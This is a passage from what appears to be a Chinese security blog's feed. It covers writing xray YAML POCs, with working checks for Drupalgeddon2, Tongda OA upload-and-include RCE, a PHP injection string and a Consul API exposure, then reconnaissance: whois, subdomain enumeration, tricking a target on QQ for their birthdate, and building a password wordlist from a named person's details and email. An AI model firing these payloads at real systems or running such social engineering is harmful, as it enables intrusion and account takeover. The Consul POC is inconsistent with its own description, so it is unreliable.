href="https://www.runoob.com/django/django-tutorial.html">https://www.runoob.com/django/django-tutorial.html</a></p><p><a href="https://www.django-rest-framework.org/">https://www.django-rest-framework.org/</a></p><p><a href="https://docs.djangoproject.com/zh-hans/3.1/">https://docs.djangoproject.com/zh-hans/3.1/</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> django </tag>
            
            <tag> django学习 </tag>
            
            <tag> django安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xray poc编写学习</title>
      <link href="/2019/07/05/xray%20poc%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/07/05/xray%20poc%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>总结一下xray官方poc编写规则：<a href="https://zhuanlan.zhihu.com/p/78334648">https://zhuanlan.zhihu.com/p/78334648</a></p><h2 id="基本的poc结构"><a href="#基本的poc结构" class="headerlink" title="基本的poc结构"></a>基本的poc结构</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-example-com</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line">      <span class="string">status==200</span> <span class="string">&amp;&amp;</span> <span class="string">body.bcontains(b&#x27;Example</span> <span class="string">Domain&#x27;)</span></span><br></pre></td></tr></table></figure><p>整个poc包含三个键值对：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name: string                 poc名称如：poc-yaml-tongda-oa-rce</span><br><span class="line">rules: []Rule poc规则：poc请求路径，请求内容，回显信息都由此匹配</span><br><span class="line">detail: map[string]string 发送给xray的信息，就是平时xray扫描得到漏洞时xray返回的那一串爆红信息</span><br></pre></td></tr></table></figure><h2 id="rulers规则"><a href="#rulers规则" class="headerlink" title="rulers规则"></a>rulers规则</h2><p>三个键值对中最重要的就是rules键值对，下面简单介绍一下编写规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">method: string 请求方法</span><br><span class="line">path: string 请求的完整Path，包括querystring等</span><br><span class="line">headers: map[string]string 请求HTTP头，Rule中指定的值会被覆盖到原始数据包的HTTP头中</span><br><span class="line">body: string 请求的Body</span><br><span class="line">follow_redirects: bool 是否允许跟随300跳转</span><br><span class="line">expression: string</span><br><span class="line">search: string</span><br></pre></td></tr></table></figure><p>根据这些键的作用，我们将其分为三类：</p><ol><li><code>method</code>、<code>path</code>、<code>headers</code>、<code>body</code>、<code>follow_redirects</code>的作用是生成检测漏洞的数据包</li><li><code>expression</code>的作用是判断该条Rule的结果</li><li><code>search</code>的作用是从返回包中提取信息</li></ol><h2 id="xray对于POC扫描的流程如下："><a href="#xray对于POC扫描的流程如下：" class="headerlink" title="xray对于POC扫描的流程如下："></a>xray对于POC扫描的流程如下：</h2><p>POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的<code>method</code>、<code>path</code>、<code>headers</code>、<code>body</code>、<code>follow_redirects</code>键值，替换原始数据包中的对应信息。</p><p>替换后的数据包被发送，并获得返回包，再执行expression表达式，表达式结果作为该条Rule的结果；</p><p>同时，我们通过search指定的正则表达式，可以从返回包body中提取一些信息，作为下一个rule，或detail中可以被引用的内容。</p><h2 id="expression表达式编写"><a href="#expression表达式编写" class="headerlink" title="expression表达式编写"></a>expression表达式编写</h2><p>样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status==200 &amp;&amp; body.bcontains(b&#x27;Example Domain&#x27;)</span><br></pre></td></tr></table></figure><p>函数简单总结一下即是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">body.contains(&#x27;string&#x27;): 判断响应包中是否含有string字符串</span><br><span class="line">body.bcontains(b&#x27;\x00\x01\x02&#x27;):判断body中是否包含0x000102这段二进制代码</span><br><span class="line"></span><br><span class="line">r&#x27;^test&#x27;.matches(body):判断响应包是否以test开头，这里也可以用:body.startsWith(&#x27;test&#x27;)来代替。</span><br><span class="line">r&#x27;^PK\x03\x04&#x27;.bmatches(body)：判断响应包是否以PK0x0304开头,PK0x0304为zip文件的16进制头</span><br><span class="line"></span><br><span class="line">body.startsWith(&#x27;test&#x27;):判断响应包是否以字符串test开头</span><br><span class="line">body.endsWith(&#x27;test&#x27;):判断响应包是否以字符串test结尾</span><br></pre></td></tr></table></figure><p>官方样列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">body.bcontains(b&#x27;test&#x27;)</span><br><span class="line">返回包body包含test，因为body是一个bytes类型的变量，所以我们需要使用bcontains方法，且其参数也是bytes</span><br><span class="line"></span><br><span class="line">content_type.contains(&#x27;application/octet-stream&#x27;) &amp;&amp; body.bcontains(b&#x27;\x00\x01\x02&#x27;)</span><br><span class="line">返回包的content-type包含“application/octet-stream”，且body中包含0x000102这段二进制串</span><br><span class="line"></span><br><span class="line">content_type.contains(&#x27;zip&#x27;) &amp;&amp; r&#x27;^PK\x03\x04&#x27;.bmatches(body)</span><br><span class="line">这个规则用来判断返回的内容是否是zip文件，需要同时满足条件：content-type包含关键字“zip”，且body匹配上正则r’^PK\x03\x04’（就是zip的文件头）。因为startsWith方法只支持字符串的判断，所以这里没有使用。</span><br><span class="line"></span><br><span class="line">status &gt;= 300 &amp;&amp; status &lt; 400</span><br><span class="line">返回包的status code在300~400之间</span><br><span class="line"></span><br><span class="line">(status &gt;= 500 &amp;&amp; status != 502) || r&#x27;&lt;input value=&quot;(.+?)&quot;&#x27;.bmatches(body)</span><br><span class="line">返回包status code大于等于500且不等于502，或者Body包含表单</span><br></pre></td></tr></table></figure><p>官方注意声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\r\n&#x27; 表示换行</span><br><span class="line">r&#x27;\r\n&#x27; 不表示换行，仅仅表示这4个字符。在编写正则时很有意义。</span><br><span class="line">b&#x27;test&#x27; 一个字节流（bytes），在golang中即为[]byte</span><br><span class="line"></span><br><span class="line">expression表达式返回的必须是一个bool类型的结果，这个结果作为整个Rule的值，而rules由多个Rule组成。值为true的Rule，如果后面还有其他Rule，则继续执行后续Rule，如果后续没有其他Rule，则表示该POC的结果是true；如果一个Rule的expression返回false，则不再执行后续Rule，也表示本POC的返回结果是false。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>也就是说，一个POC的rules中，最后一个Rule的值，决定是否存在漏洞。</code></strong></p><h2 id="search的作用"><a href="#search的作用" class="headerlink" title="search的作用"></a>search的作用</h2><p>一个Rule中，可以支持使用search来查找返回包中的内容；当然，如果不需要查找内容，则可以忽略search。</p><p>search是一个字符串类型的正则表达式，我们用一个简单的案例来进行说明。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search: |</span><br><span class="line">     &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;(.+?)&quot;</span><br></pre></td></tr></table></figure><p>该处表示匹配从 &lt;input type=”hidden”开头的html文本中提取csrftoken值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search: |</span><br><span class="line">      name=&quot;form_build_id&quot;\s+value=&quot;(.+?)&quot;</span><br></pre></td></tr></table></figure><p>该处则表示从响应中提取form_build_id值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search: (?P&lt;dirname&gt;200\d)_(?P&lt;filename&gt;\d+)</span><br></pre></td></tr></table></figure><p>该处则表示从响应中提取dirname，filename。</p><p>匹配响应中_相连的两个字符，并单独获取匹配结果。?P获取匹配值，/d确定字符边界。</p><h1 id="poc示例"><a href="#poc示例" class="headerlink" title="poc示例"></a>poc示例</h1><p>可以直接在xray的官方仓库查看大佬们编写的poc,学习一下是如何写的poc</p><p><a href="https://github.com/chaitin/xray/tree/master/pocs">https://github.com/chaitin/xray/tree/master/pocs</a></p><p>网上的一些poc例子：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-example-com</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/update&quot;</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">search:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;(.+?)&quot;</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/update&quot;</span></span><br><span class="line">    <span class="attr">body:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      id=&#x27;;echo(md5(123));//&amp;csrftoken=&#123;&#123;1&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line">      <span class="string">status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">body.bcontains(b&#x27;202cb962ac59075b964b07152d234b70&#x27;)</span></span><br></pre></td></tr></table></figure><p><strong>Drupal7 drupalgeddon2 命令执行漏洞（CVE-2018-7600</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-drupal-drupalgeddon2-rce</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/?q=user/password&amp;name[%23post_render][]=printf&amp;name[%23type]=markup&amp;name[%23markup]=test%25%25test&quot;</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">User-Agent:</span> <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span></span><br><span class="line">    <span class="attr">body:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      form_id=user_pass&amp;_triggering_element_name=name&amp;_triggering_element_value=&amp;opz=E-mail+new+Password</span></span><br><span class="line"><span class="string"></span>    <span class="attr">search:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      name=&quot;form_build_id&quot;\s+value=&quot;(.+?)&quot;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      status==200</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/?q=file%2Fajax%2Fname%2F%23value%2F<span class="template-variable">&#123;&#123;1&#125;&#125;</span>&quot;</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">User-Agent:</span> <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span></span><br><span class="line">    <span class="attr">body:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      form_build_id=&#123;&#123;1&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      body.bcontains(b&#x27;test%test&#x27;)</span></span><br><span class="line"><span class="string"></span><span class="attr">detail:</span></span><br><span class="line">  <span class="attr">drupal_version:</span> <span class="number">7</span></span><br></pre></td></tr></table></figure><p><strong>通达OA-RCE-POC示例</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-tongda-oa-rce</span></span><br><span class="line"><span class="attr">set:</span></span><br><span class="line">  <span class="attr">rand:</span> <span class="string">randomInt(200000000,</span> <span class="number">210000000</span><span class="string">)</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/ispirit/im/upload.php</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36&#x27;</span></span><br><span class="line">      <span class="attr">Content-Type:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        multipart/form-data;charset=utf-8;boundary=---------------------------27723940316706158781839860668</span></span><br><span class="line"><span class="string"></span>      <span class="attr">Accept-Encoding:</span> <span class="string">&#x27;deflate&#x27;</span></span><br><span class="line">    <span class="attr">body:</span> <span class="string">|-</span></span><br><span class="line"><span class="string">      -----------------------------27723940316706158781839860668</span></span><br><span class="line"><span class="string">      Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span></span><br><span class="line"><span class="string">      Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      &#123;&#123;<span class="string">rand</span>&#125;&#125;</span><br><span class="line">      <span class="string">-----------------------------27723940316706158781839860668</span></span><br><span class="line">      <span class="attr">Content-Disposition:</span> <span class="string">form-data;</span> <span class="string">name=&quot;P&quot;</span></span><br><span class="line"></span><br><span class="line">      &#123;&#123;<span class="string">rand</span>&#125;&#125;</span><br><span class="line">      <span class="string">-----------------------------27723940316706158781839860668</span></span><br><span class="line">      <span class="attr">Content-Disposition:</span> <span class="string">form-data;</span> <span class="string">name=&quot;DEST_UID&quot;</span></span><br><span class="line"></span><br><span class="line">      &#123;&#123;<span class="string">rand</span>&#125;&#125;</span><br><span class="line">      <span class="string">-----------------------------27723940316706158781839860668</span></span><br><span class="line">      <span class="attr">Content-Disposition:</span> <span class="string">form-data;</span> <span class="string">name=&quot;UPLOAD_MODE&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="number">1</span></span><br><span class="line">      <span class="string">-----------------------------27723940316706158781839860668</span></span><br><span class="line">    <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      response.status == 200</span></span><br><span class="line"><span class="string"></span>    <span class="attr">search:</span> <span class="string">(?P&lt;dirname&gt;200\d)_(?P&lt;filename&gt;\d+)</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/ispirit/interface/gateway.php</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36&#x27;</span></span><br><span class="line">      <span class="attr">Content-Type:</span> <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">      <span class="attr">Accept-Encoding:</span> <span class="string">&#x27;deflate&#x27;</span></span><br><span class="line">    <span class="attr">body:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        json=&#123;&quot;url&quot;:&quot;../../../general/../attach/im/&#123;&#123;dirname&#125;&#125;/&#123;&#123;filename&#125;&#125;.jpg&quot;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      response.status == 200 &amp;&amp; response.body.bcontains(bytes(string(rand)))</span></span><br><span class="line"><span class="string"></span><span class="attr">detail:</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">清风明月(www.secbook.info)</span></span><br><span class="line">  <span class="attr">demo_tongda_version:</span> <span class="string">&#x27;tongda-oa-11.3&#x27;</span></span><br><span class="line">  <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://www.anquanke.com/post/id/201174</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://github.com/fuhei/tongda_rce/blob/master/tongda_rce.py</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="编写测试"><a href="#编写测试" class="headerlink" title="编写测试"></a>编写测试</h1><p>高效率编写poc学习文章：<br><a href="https://docs.xray.cool/#/guide/high_quality_poc">https://docs.xray.cool/#/guide/high_quality_poc</a></p><p><a href="https://paper.seebug.org/9/">https://paper.seebug.org/9/</a></p><p>这里简单编写一下某src发现的<strong>Consul Service API远程命令执行漏洞</strong></p><p>该漏洞访问/v1/agent/self路径，响应中EnableLocalScriptChecks”: true即可大概率判断存在远程命令执行漏洞,非常容易写poc进行判断</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-ConsulServiceApi_rce</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/v1/agent/self&quot;</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line">      <span class="string">status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">body.contains(b&#x27;&quot;EnableRemoteScriptChecks&quot;:</span> <span class="literal">true</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><p>漏洞详情：<a href="https://www.imzzj.com/2019/07/04/hashicorp-consul-service-api-yuan-cheng-ming-ling-zhi-xing-lou-dong.html">https://www.imzzj.com/2019/07/04/hashicorp-consul-service-api-yuan-cheng-ming-ling-zhi-xing-lou-dong.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xray poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2019/07/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/07/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>在拿到一个域名资产的时候首先要做的就是信息收集。毕竟大师傅们都说，渗透测试的本质是信息收集。</p><h1 id="1-whois查询"><a href="#1-whois查询" class="headerlink" title="1. whois查询"></a>1. whois查询</h1><p>whois查询在对中小网站进行测试时很有用。通过whois查询可以知道域名注册人信息和注册邮箱。</p><p>对自己域名查询一下：</p><h3 id="1-1-在线查询"><a href="#1-1-在线查询" class="headerlink" title="1.1 在线查询"></a>1.1 在线查询</h3><p>这里使用爱站在线查询：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p><img src="1.1.1.png" alt="1.1"></p><p>淦！真实姓名和部分邮箱都暴露了</p><p>whois在线查询网站：</p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>（下面五个网站，连我完整qq都查出来了，恐怖如斯）</p><p><a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a></p><p><a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a></p><p><a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p><p><a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p><p><a href="https://whois.ename.net/">https://whois.ename.net/</a></p><p>更多在线查询网站：</p><p>西部数码域名WHOIS信息查询地址：<a href="https://whois.west.cn/">https://whois.west.cn/</a></p><p>新网域名WHOIS信息查询地址：<a href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a></p><p>中资源域名WHOIS信息查询地址：<a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a></p><p>三五互联域名WHOIS信息查询地址：<a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a></p><p>爱名网域名WHOIS信息查询地址：<a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p><p>一个网站查不出来的时候，多试几个总没坏处，万一呢</p><h3 id="1-2-工具查询"><a href="#1-2-工具查询" class="headerlink" title="1.2 工具查询"></a>1.2 工具查询</h3><p>工具查询可以使用kali自带的whois查询工具</p><p><img src="1.1.2.png" alt="1.1.2"></p><h3 id="1-3-收集信息的利用"><a href="#1-3-收集信息的利用" class="headerlink" title="1.3 收集信息的利用"></a>1.3 收集信息的利用</h3><p>讲了这么多，最终还是要把收集的信息利用起来。根据whois对域名的查询。现在我们已经知道了以下信息</p><ul><li>域名注册者（一般就是站长）姓名</li><li>域名注册者邮箱</li><li>域名注册商</li><li>域名注册时间</li></ul><p>知道域名注册者姓名，注册者邮箱和域名注册时间。我们就可以根据这些信息制作用户名，密码爆破字典。</p><p>特别是这里还使用了qq邮箱，那么可以直接添加qq好友，进行社会工程学攻击。</p><p><strong>这里简单演示一下密码爆破字典的制作：</strong></p><p>为了获取更多信息，可以直接添加qq，套出更多信息。这里只简单添加好友获取一下受害者的出生日期。</p><p>很多人的密码组合都是用户名+出生日期。</p><p><img src="1.3.1.jpg" alt="1.3.1"></p><p>那么现在我们已经知道了受害者的，姓名，邮箱，出生日期。这是就可以使用社工工具生成密码字典</p><p>这里使用pydictor （这个工具除了，生成密码字典，还有很多实用的功能，如合并去重，批量添加指定前缀…等等)</p><p>github地址：<a href="https://github.com/LandGrey/pydictor/blob/master/README_CN.md">https://github.com/LandGrey/pydictor/blob/master/README_CN.md</a></p><p>python3运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python pydictor --sedb</span><br><span class="line"></span><br><span class="line">set cname zhuxiang</span><br><span class="line">set sname xiang zhu</span><br><span class="line">set birth 19990312</span><br><span class="line">set nickname h11ba1</span><br><span class="line">set email 1406249263@qq.com</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="1.1.3.png" alt="1.1.3"></p><p>密码生成到了results文件夹里面</p><p><img src="1.1.4.png" alt="1.1.4"></p><p>最终在其中找到了以前用的密码…..</p><h1 id="2-子域名收集"><a href="#2-子域名收集" class="headerlink" title="2.子域名收集"></a>2.子域名收集</h1><p>子域名的收集可以在主站(www开头，如<a href="http://www.baidu.com/">www.baidu.com</a>) 难以攻破的情况下，找寻更多的攻击面</p><p>子域名常用收集方法：</p><ul><li>工具收集</li><li>google语法收集</li><li>fofa收集</li></ul><h3 id="2-1工具收集"><a href="#2-1工具收集" class="headerlink" title="2.1工具收集"></a>2.1工具收集</h3><p>比较常用的收集工具是：</p><p>oneforall : <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p>subDomain : <a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p>layer子域名挖掘机：这个网上搜索一下有，或者找我要（总感觉小网站下载的东西都有后门）</p><p><strong>oneforall：</strong></p><p>个人比较习惯使用搭建在服务器上面的dokcer版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 拉去docker 镜像</span><br><span class="line">docker pull shmilylty/oneforall</span><br><span class="line"></span><br><span class="line">//使用时启动镜像</span><br><span class="line">docker run -it shmilylty/oneforall</span><br><span class="line"></span><br><span class="line">//收集子域名</span><br><span class="line">python oneforall.py --target baidu.com</span><br></pre></td></tr></table></figure><p>在自己电脑上安装使用也很不错，个人习惯问题~</p><p><strong>subDomain：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 subDomainsBrute.py baidu.com</span><br></pre></td></tr></table></figure><p><img src="1.2.2.png" alt="1.2.2"></p><h3 id="2-2-搜索引擎语法搜索子域名"><a href="#2-2-搜索引擎语法搜索子域名" class="headerlink" title="2.2 搜索引擎语法搜索子域名"></a>2.2 搜索引擎语法搜索子域名</h3><p>google 语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:&quot;baidu.com&quot; -www</span><br></pre></td></tr></table></figure><p><img src="2.2.1.png" alt="2.2.1"></p><p>百度语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:bilibili.com link:bilibili.com</span><br></pre></td></tr></table></figure><p><img src="2.2.2.png" alt="2.2.2"></p><p>必应语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com</span><br></pre></td></tr></table></figure><p><img src="2.2.3.png" alt="2.2.3"></p><h3 id="2-3-空间搜索引擎搜索"><a href="#2-3-空间搜索引擎搜索" class="headerlink" title="2.3 空间搜索引擎搜索"></a>2.3 空间搜索引擎搜索</h3><p>fofa搜索子域名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain=&quot;qq.com&quot; </span><br></pre></td></tr></table></figure><p><img src="2.3.1.png" alt="2.3.1"></p><p>添加<code>&amp;&amp;header=200</code>可以过滤404子域网站。</p><p>其他的空间搜索引擎还有shodan,zoomeye，和安恒的sumap</p><h3 id="2-4-收集子域名的利用"><a href="#2-4-收集子域名的利用" class="headerlink" title="2.4 收集子域名的利用"></a>2.4 